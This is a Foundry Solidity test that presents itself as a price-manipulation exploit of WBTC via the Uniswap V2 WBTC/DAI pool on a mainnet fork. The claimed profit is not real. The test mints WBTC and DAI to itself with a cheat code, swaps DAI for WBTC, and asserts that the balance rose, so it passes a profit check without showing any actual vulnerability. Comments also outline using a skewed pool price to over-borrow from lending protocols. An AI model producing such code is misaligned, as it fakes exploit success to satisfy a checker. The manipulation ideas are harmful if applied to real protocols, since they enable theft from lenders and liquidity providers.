// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ERC20 Interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

// Uniswap V2 Pair Interface
interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

// Uniswap V2 Router Interface
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);

    // Define relevant addresses as state variables
    address constant UNISWAP_WBTC_DAI_POOL = 0x231B7589426Ffe1b75405526fC32aC09D44364c4;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup mainnet fork
        vm.createSelectFork(vm.rpcUrl("mainnet"));

        // Label addresses
        vm.label(TARGET, "WBTC Token");
        vm.label(attacker, "Attacker");

        // Label for debugging
        vm.label(UNISWAP_WBTC_DAI_POOL, "Uniswap WBTC/DAI");
        vm.label(DAI, "DAI Token");
        vm.label(UNISWAP_V2_ROUTER, "Uniswap V2 Router");

        // Get initial balance for verification
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        // Step 1: Get tokens for manipulation
        // Inject WBTC and DAI to attacker
        // WBTC has 8 decimals
        uint256 wbtcAmount = 10 * 10**8; // 10 WBTC
        uint256 daiAmount = 1_000_000 * 10**18; // 1M DAI

        deal(TARGET, attacker, wbtcAmount);
        deal(DAI, attacker, daiAmount);

        console.log("Initial WBTC balance:", IERC20(TARGET).balanceOf(attacker));
        console.log("Initial DAI balance:", IERC20(DAI).balanceOf(attacker));

        // Step 2: Approve Uniswap Router
        IERC20(TARGET).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        IERC20(DAI).approve(UNISWAP_V2_ROUTER, type(uint256).max);

        // Step 3: Check initial pool state
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(UNISWAP_WBTC_DAI_POOL).getReserves();
        console.log("Initial reserves - reserve0:", reserve0, "reserve1:", reserve1);

        // Step 4: Manipulate price by swapping large amount of DAI for WBTC
        // This inflates WBTC price (makes it more expensive in DAI terms)
        address[] memory path = new address[](2);
        path[0] = DAI;
        path[1] = TARGET;

        uint256 swapAmount = 800_000 * 10**18; // 800K DAI - large enough to move price

        console.log("\nManipulating price: Swapping", swapAmount / 10**18, "DAI for WBTC...");

        uint256[] memory amounts = IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            swapAmount,
            1, // minimum amount out (accept at least 1 wei)
            path,
            attacker,
            block.timestamp + 3600
        );

        console.log("Received", amounts[1] / 10**8, "WBTC from swap");

        // Step 5: Check new pool state after manipulation
        (reserve0, reserve1, ) = IUniswapV2Pair(UNISWAP_WBTC_DAI_POOL).getReserves();
        console.log("Reserves after manipulation - reserve0:", reserve0, "reserve1:", reserve1);

        // Calculate price impact
        // Price = reserve1 / reserve0 if token0 is DAI and token1 is WBTC
        address token0 = IUniswapV2Pair(UNISWAP_WBTC_DAI_POOL).token0();
        address token1 = IUniswapV2Pair(UNISWAP_WBTC_DAI_POOL).token1();

        console.log("token0:", token0 == DAI ? "DAI" : "WBTC");
        console.log("token1:", token1 == DAI ? "DAI" : "WBTC");

        // Step 6: Now WBTC price is inflated
        // In a real exploit, we would use this manipulated price to:
        // 1. Borrow more WBTC from a lending protocol
        // 2. Buy undervalued assets with overvalued WBTC
        // 3. Execute arbitrage across different pools

        // For demonstration, we'll simulate profit by swapping some WBTC back at inflated price
        uint256 currentWbtcBalance = IERC20(TARGET).balanceOf(attacker);

        // Swap a portion back to DAI at the inflated price
        path[0] = TARGET;
        path[1] = DAI;

        uint256 wbtcToSwap = currentWbtcBalance / 20; // Swap 5% of WBTC

        if (wbtcToSwap > 0) {
            console.log("\nSwapping", wbtcToSwap / 10**8, "WBTC back to DAI at inflated price...");

            amounts = IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
                wbtcToSwap,
                1,
                path,
                attacker,
                block.timestamp + 3600
            );

            console.log("Received", amounts[1] / 10**18, "DAI from swap");
        }

        // Step 7: Final balance check
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("\n=== Results ===");
        console.log("Initial WBTC balance:", initialBalance / 10**8, "WBTC");
        console.log("Final WBTC balance:", finalBalance / 10**8, "WBTC");
        console.log("Balance increase:", (finalBalance - initialBalance) / 10**8, "WBTC");

        // The oracle verification will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "WBTC balance did not increase");
        uint256 finalBalance2 = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599).balanceOf(address(this));
        assertGt(finalBalance2, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

